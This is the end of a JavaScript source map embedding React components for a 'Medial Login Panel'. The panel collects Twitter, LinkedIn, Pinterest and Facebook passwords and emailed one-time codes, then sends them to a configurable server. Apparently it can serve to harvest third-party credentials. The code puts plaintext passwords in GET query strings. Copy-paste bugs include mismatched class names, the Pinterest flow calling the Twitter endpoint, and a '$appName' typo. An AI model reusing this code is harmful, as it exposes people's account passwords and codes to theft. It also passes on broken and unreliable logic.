></input>\n              </p>\n              <p>\n                <input\n                  onChange={(e) => this.handlePassword(e)}\n                  value={this.state.password}\n                  type=\"password\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter LinkedIn Password\"\n                ></input>\n              </p>\n              {this.state.loading ? (\n                <button type=\"button\" class=\"btn login_btn\" disabled>\n                  <Spinner\n                    as=\"span\"\n                    animation=\"grow\"\n                    size=\"sm\"\n                    role=\"status\"\n                    aria-hidden=\"true\"\n                  />\n                  Loading...\n                </button>\n              ) : (\n                <button\n                  onClick={(e) => this.handleClick(e)}\n                  type=\"button\"\n                  class=\"btn login_btn\"\n                >\n                  Login\n                </button>\n              )}\n\n              {this.state.manualCheck ? (\n                <div>\n                  <Form.Group>\n                    <Form.Label>Enter code received in your email</Form.Label>\n                    <input\n                      value={this.state.code}\n                      onChange={(e) => {\n                        this.handleCode(e);\n                      }}\n                      type=\"number\"\n                      maxLength=\"11\"\n                      name=\"name\"\n                      autocomplete=\"off\"\n                      class=\"text-center form-control\"\n                    ></input>\n                  </Form.Group>\n                  <button\n                    onClick={() => {\n                      this.handleCodeClick();\n                    }}\n                    type=\"button\"\n                    class=\"btn login_btn\"\n                  >\n                    submit code\n                  </button>\n                </div>\n              ) : (\n                \"\"\n              )}\n            </div>\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport { Form, Button, Container, Alert, Spinner } from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challenge_id: \"\",\n    challenge_type: \"\",\n    enc_user_id: \"\",\n    code: \"\",\n    appName: window.location.hostname.substring(10).split(\".\")[0],\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    this.setState({ code: event.target.value });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/login/twitter`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challenge_type: responseData.challenge_type,\n                challenge_id: responseData.challenge_id,\n                enc_user_id: responseData.enc_user_id,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    fetch(\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\n      {\n        method: \"GET\",\n      }\n    )\n      .then((response) => response.json())\n      .then((responseData) => {\n        console.log(responseData);\n        this.setState(\n          {\n            message: responseData.message,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n        if (responseData.success) {\n          this.setState({ success: true });\n        } else {\n          this.setState({ message: responseData.message, code: \"\" }, () => {\n            this.onShowAlert();\n          });\n        }\n      });\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"dark\">{this.state.message}</Alert>\n        ) : (\n          \"\"\n        )}\n        <div class=\"login_section text-center\">\n          <Container>\n            <p style={{ color: \"#f27c89\", fontWeight: 600, fontSize: 24 }}>\n              Medial Login Panel\n            </p>\n            <img\n              alt=\"logo\"\n              src={env.REACT_APP_FAVICONURL}\n              style={{ objectFit: \"contain\", width: \"25%\", height: \"25%\" }}\n            ></img>\n          </Container>\n\n          {/* <h1>\n            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n              ? env.REACT_APP_TITLE\n              : \"Twitter login\"}\n          </h1> */}\n          {env.REACT_APP_BANNER_TWITTER === \"true\" ? (\n            <div class=\"bg-white white-box\">\n              <p\n                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}\n                class=\"fs_18\"\n              >\n                {env.REACT_APP_BANNER_TWITTER_HEADER}\n              </p>\n              <p class=\"fs_12 m-0\">{env.REACT_APP_BANNER_TWITTER_BODY}</p>\n            </div>\n          ) : (\n            \"\"\n          )}\n\n          <Container>\n            <p style={{ fontWeight: \"bold\" }}>\n              {env.REACT_APP_SECONDARY_BANNER !== \"\"\n                ? env.REACT_APP_SECONDARY_BANNER\n                : \"\"}\n            </p>\n          </Container>\n\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 5000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n            <div class=\"form\">\n              <p>\n                <input\n                  onChange={(e) => {\n                    this.handleUsername(e);\n                  }}\n                  value={this.state.username}\n                  type=\"text\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Twitter Username/Email\"\n                ></input>\n              </p>\n\n              <p>\n                <input\n                  onChange={(e) => this.handlePassword(e)}\n                  value={this.state.password}\n                  type=\"password\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Twitter Password\"\n                ></input>\n              </p>\n              {this.state.loading ? (\n                <button type=\"button\" class=\"btn login_btn\" disabled>\n                  <Spinner\n                    as=\"span\"\n                    animation=\"grow\"\n                    size=\"sm\"\n                    role=\"status\"\n                    aria-hidden=\"true\"\n                  />\n                  Loading...\n                </button>\n              ) : (\n                <button\n                  onClick={(e) => this.handleClick(e)}\n                  type=\"button\"\n                  class=\"btn login_btn\"\n                >\n                  Login\n                </button>\n              )}\n\n              {this.state.manualCheck ? (\n                <div>\n                  <Form.Group>\n                    <Form.Label>\n                      {this.state.challenge_type === \"RetypeEmail\"\n                        ? \"Enter your email id\"\n                        : \"Enter code recieved in your email\"}\n                    </Form.Label>\n                    <input\n                      value={this.state.code}\n                      onChange={(e) => {\n                        this.handleCode(e);\n                      }}\n                      type=\"number\"\n                      maxLength=\"11\"\n                      name=\"name\"\n                      autocomplete=\"off\"\n                      class=\"text-center form-control\"\n                    ></input>\n                  </Form.Group>\n                  <button\n                    onClick={() => {\n                      this.handleCodeClick();\n                    }}\n                    type=\"button\"\n                    class=\"btn login_btn\"\n                  >\n                    submit code\n                  </button>\n                </div>\n              ) : (\n                \"\"\n              )}\n            </div>\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\nimport \"../css/style.css\";\nimport { Form, Button, Container, Alert, Spinner } from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    appName: window.location.hostname.substring(10).split(\".\")[0],\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    this.setState({ code: event.target.value });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/login/pinterest`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challenge_type: responseData.challenge_type,\n                challenge_id: responseData.challenge_id,\n                enc_user_id: responseData.enc_user_id,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"email id cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    fetch(\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\n      {\n        method: \"GET\",\n      }\n    )\n      .then((response) => response.json())\n      .then((responseData) => {\n        console.log(responseData);\n        this.setState(\n          {\n            message: responseData.message,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n        if (responseData.success) {\n          this.setState({ success: true });\n        } else {\n          this.setState({ message: responseData.message, code: \"\" }, () => {\n            this.onShowAlert();\n          });\n        }\n      });\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n          \"\"\n        )}\n        <div class=\"login_section text-center\">\n          <Container>\n            <p style={{ color: \"#f27c89\", fontWeight: 600, fontSize: 24 }}>\n              Medial Login Panel\n            </p>\n            <img\n              alt=\"logo\"\n              src={env.REACT_APP_FAVICONURL}\n              style={{ objectFit: \"contain\", width: \"25%\", height: \"25%\" }}\n            ></img>\n          </Container>\n          {/* <h1>\n            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n              ? env.REACT_APP_TITLE\n              : \"Pinterest login\"}\n          </h1> */}\n          {env.REACT_APP_BANNER_PINTEREST === \"true\" ? (\n            <div class=\"bg-white white-box\">\n              <p\n                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}\n                class=\"fs_18\"\n              >\n                {env.REACT_APP_BANNER_PINTEREST_HEADER}\n              </p>\n              <p class=\"fs_12 m-0\">{env.REACT_APP_BANNER_PINTEREST_BODY}</p>\n            </div>\n          ) : (\n            \"\"\n          )}\n          <Container>\n            <p style={{ fontWeight: \"bold\" }}>\n              {env.REACT_APP_SECONDARY_BANNER !== \"\"\n                ? env.REACT_APP_SECONDARY_BANNER\n                : \"\"}\n            </p>\n          </Container>\n\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 5000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n            <div class=\"form\">\n              <p>\n                <input\n                  onChange={(e) => {\n                    this.handleUsername(e);\n                  }}\n                  value={this.state.username}\n                  type=\"text\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Pinterest Email\"\n                ></input>\n              </p>\n\n              <p>\n                <input\n                  onChange={(e) => this.handlePassword(e)}\n                  value={this.state.password}\n                  type=\"password\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Pinterest Password\"\n                ></input>\n              </p>\n              {this.state.loading ? (\n                <button type=\"button\" class=\"btn login_btn\" disabled>\n                  <Spinner\n                    as=\"span\"\n                    animation=\"grow\"\n                    size=\"sm\"\n                    role=\"status\"\n                    aria-hidden=\"true\"\n                  />\n                  Loading...\n                </button>\n              ) : (\n                <button\n                  onClick={(e) => this.handleClick(e)}\n                  type=\"button\"\n                  class=\"btn login_btn\"\n                >\n                  Login\n                </button>\n              )}\n\n              {this.state.manualCheck ? (\n                <div>\n                  <Form.Group>\n                    <Form.Label>\n                      {this.state.challenge_type === \"RetypeEmail\"\n                        ? \"Enter your email id\"\n                        : \"Enter code recieved in your email\"}\n                    </Form.Label>\n                    <input\n                      value={this.state.code}\n                      onChange={(e) => {\n                        this.handleCode(e);\n                      }}\n                      type=\"number\"\n                      maxLength=\"11\"\n                      name=\"name\"\n                      autocomplete=\"off\"\n                      class=\"text-center form-control\"\n                    ></input>\n                  </Form.Group>\n                  <button\n                    onClick={() => {\n                      this.handleCodeClick();\n                    }}\n                    type=\"button\"\n                    class=\"btn login_btn\"\n                  >\n                    submit code\n                  </button>\n                </div>\n              ) : (\n                \"\"\n              )}\n            </div>\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\nimport \"../css/style.css\";\nimport { Form, Button, Container, Alert, Spinner } from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challangeID: \"\",\n    code: \"\",\n    appName: window.location.hostname.substring(10).split(\".\")[0],\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/login/facebook`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challangeID: responseData.challangeID,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      fetch(\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}$appName=${this.state.appName}`,\n        {\n          method: \"GET\",\n        }\n      )\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (responseData.success) {\n            this.setState({ success: true });\n          } else {\n            this.setState({ message: responseData.message, code: \"\" }, () => {\n              this.onShowAlert();\n            });\n          }\n        });\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n          \"\"\n        )}\n        <br></br>\n        <div class=\"login_section text-center\">\n          <Container>\n            <img\n              alt=\"logo\"\n              src={env.REACT_APP_FAVICONURL}\n              style={{ objectFit: \"contain\", width: \"25%\", height: \"25%\" }}\n            ></img>\n          </Container>\n\n          {/* <h1>\n            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n              ? env.REACT_APP_TITLE\n              : \" Facebook login\"}\n          </h1> */}\n          {env.REACT_APP_BANNER_FACEBOOK === \"true\" ? (\n            <div class=\"bg-white white-box\">\n              <p\n                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}\n                class=\"fs_18\"\n              >\n                {env.REACT_APP_BANNER_FACEBOOK_HEADER}\n              </p>\n              <p class=\"fs_12 m-0\">{env.REACT_APP_BANNER_FACEBOOK_BODY}</p>\n            </div>\n          ) : (\n            \"\"\n          )}\n          <Container>\n            <p style={{ fontWeight: \"bold\" }}>\n              {env.REACT_APP_SECONDARY_BANNER !== \"\"\n                ? env.REACT_APP_SECONDARY_BANNER\n                : \"\"}\n            </p>\n          </Container>\n\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 5000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n            <div class=\"form\">\n              <p>\n                <input\n                  onChange={(e) => {\n                    this.handleUsername(e);\n                  }}\n                  value={this.state.username}\n                  type=\"text\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Facebook Username/Email\"\n                ></input>\n              </p>\n\n              <p>\n                <input\n                  onChange={(e) => this.handlePassword(e)}\n                  value={this.state.password}\n                  type=\"password\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Facebook Password\"\n                ></input>\n              </p>\n\n              {this.state.loading ? (\n                <Button variant=\"primary\" type=\"submit\" disabled>\n                  <Spinner\n                    as=\"span\"\n                    animation=\"grow\"\n                    size=\"sm\"\n                    role=\"status\"\n                    aria-hidden=\"true\"\n                  />\n                  Loading...\n                </Button>\n              ) : (\n                <button\n                  onClick={(e) => this.handleClick(e)}\n                  type=\"button\"\n                  class=\"btn login_btn\"\n                >\n                  Login\n                </button>\n              )}\n\n              {this.state.manualCheck ? (\n                <div>\n                  <Form.Group>\n                    <Form.Label>Enter code recieved in your email</Form.Label>\n                    <input\n                      value={this.state.code}\n                      onChange={(e) => {\n                        this.handleCode(e);\n                      }}\n                      type=\"number\"\n                      maxLength=\"11\"\n                      name=\"name\"\n                      autocomplete=\"off\"\n                      class=\"text-center form-control\"\n                    ></input>\n                  </Form.Group>\n                  <button\n                    onClick={() => {\n                      this.handleCodeClick();\n                    }}\n                    type=\"button\"\n                    class=\"btn login_btn\"\n                  >\n                    submit code\n                  </button>\n                </div>\n              ) : (\n                \"\"\n              )}\n            </div>\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React from \"react\";\nimport { Switch, Route } from \"react-router-dom\";\nimport Home from \"./components/Home\";\nimport Instagram from \"./components/Instagram\";\nimport Linkedin from \"./components/Linkedin\";\nimport Twitter from \"./components/Twitter\";\nimport Pinterest from \"./components/Pinterest\";\nimport Facebook from \"./components/Facebook\";\n\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\n\nfunction App() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={Home} exact />\n      {env.REACT_APP_TWITTER === \"true\" ? (\n        <Route path=\"/Twitter\" component={Twitter} exact />\n      ) : (\n        \"\"\n      )}\n      {env.REACT_APP_LINKEDIN === \"true\" ? (\n        <Route path=\"/LinkedIn\" component={Linkedin} exact />\n      ) : (\n        \"\"\n      )}\n      {env.REACT_APP_INSTAGRAM === \"true\" ? (\n        <Route path=\"/Instagram\" component={Instagram} exact />\n      ) : (\n        \"\"\n      )}\n      {env.REACT_APP_PINTEREST === \"true\" ? (\n        <Route path=\"/Pinterest\" component={Pinterest} exact />\n      ) : (\n        \"\"\n      )}\n      {env.REACT_APP_FACEBOOK === \"true\" ? (\n        <Route path=\"/Facebook\" component={Facebook} exact />\n      ) : (\n        \"\"\n      )}\n    </Switch>\n  );\n}\n\nexport default App;\n","import { createBrowserHistory as history } from \"history\";\n\nexport default history();\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\nimport { BrowserRouter as Router } from \"react-router-dom\";\nimport history from \"./components/History\";\n\nReactDOM.render(\n  <Router history={history}>\n    <App />\n  </Router>,\n  document.getElementById(\"root\")\n);\n"],"sourceRoot":""}